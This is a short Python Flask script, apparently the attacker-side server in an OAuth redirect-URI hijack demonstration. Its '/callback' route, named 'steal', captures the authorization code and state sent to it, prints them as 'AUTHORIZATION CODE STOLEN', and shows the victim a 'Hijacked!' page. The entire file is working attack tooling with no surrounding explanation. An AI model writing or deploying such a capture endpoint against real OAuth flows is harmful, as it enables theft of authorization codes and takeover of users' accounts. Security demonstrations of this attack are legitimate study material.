from flask import Flask, request

app = Flask(__name__)

@app.route('/callback')
def steal():
    code = request.args.get('code')
    state = request.args.get('state')
    print("\n" + "="*50)
    print(f"🔥 AUTHORIZATION CODE STOLEN: {code}")
    print(f"State: {state}")
    print("Attacker can now use this code to get access token!")
    print("="*50 + "\n")
    return "<h2>Hijacked! Code intercepted.</h2><p>Check attacker terminal.</p>"

if __name__ == '__main__':
    app.run(port=8888)